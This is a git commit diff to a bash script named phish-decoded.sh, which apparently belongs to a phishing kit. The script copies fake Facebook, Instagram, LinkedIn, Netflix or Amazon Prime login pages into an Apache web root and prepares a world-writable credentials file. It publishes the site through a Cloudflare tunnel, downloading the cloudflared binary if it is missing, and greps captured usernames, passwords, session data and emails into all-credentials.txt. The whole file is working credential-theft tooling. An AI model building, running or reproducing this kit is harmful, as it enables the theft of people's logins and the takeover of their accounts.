b2027eb6b515b97c1882fd2ab49cde72d271fbef
Shivam Bhandari <105709233+sbshivam14@users.noreply.github.com>
2023-07-21 17:41:53 -0400

    phish-decoded.sh

--- phish-decoded.sh
+++ phish-decoded.sh
@@ -3,21 +3,33 @@
 #Function to copy files
 copyingfile()
 {
-	echo -e "You have choosen $1  \n \n"
+	echo -e "You have choosen $1  \n"
         sudo cp sites/$1/* /var/www/html/
 	sudo echo -n > /var/www/html/credentials.txt
 	sudo chmod ogu+xwr /var/www/html/credentials.txt
 	echo -e "\n$1" >> all-credentials.txt
 }
 
+#Checking Cloudflared File
+cloudflared()
+{
+if [ -f "cloudflared-linux-amd64" ]; then
+	echo -e "Cloudflared Working... \n"
+else
+	echo -e "Intsalling Cloudflared... \n"
+	wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+	chmod +x cloudflared-linux-amd64
+fi
+}
+
 #Creating Cloudflared link
 link()
 {
-	echo -e "Generating Link for you..."
+	echo -e "Generating Link for you... \n"
 	sleep 3
 	chmod +x cloudflared-linux-amd64
 	./cloudflared-linux-amd64 --url 127.0.0.1/
-	echo -e "\n Your data has been successfully stored \n \n"
+	echo -e "\nYour data has been stored successfully in all-credentials.txt\n"
 
 	#Displaying and storing credentials
 	sudo grep -e user -e pass -e session -e email  /var/www/html/credentials.txt
@@ -69,29 +81,34 @@ echo -e '[5] Amazon prime \n'
 read website
 
 #Starting Apache2 server
-echo -e " Starting Apache2 service... \n \n"
+echo -e "\nStarting Apache2 service... \n"
 sudo service apache2 start
 
 #Checking which website user chose
 if [ $website = 1 ]; then
 	copyingfile "Facebook"
+	cloudflared
 	link
 
 elif [ $website = 2  ]; then
 	copyingfile "Instagram"
+	cloudflared
 	link
 	deleting_instagram_images
 
 elif [ $website = 3  ]; then
         copyingfile "Linkedin"
+	cloudflared
 	link
 
 elif [ $website = 4  ]; then
 	copyingfile "Netflix"
+	cloudflared
 	link
 
 elif [ $website = 5  ]; then
 	copyingfile "Prime"
+	cloudflared
 	link
 
 else
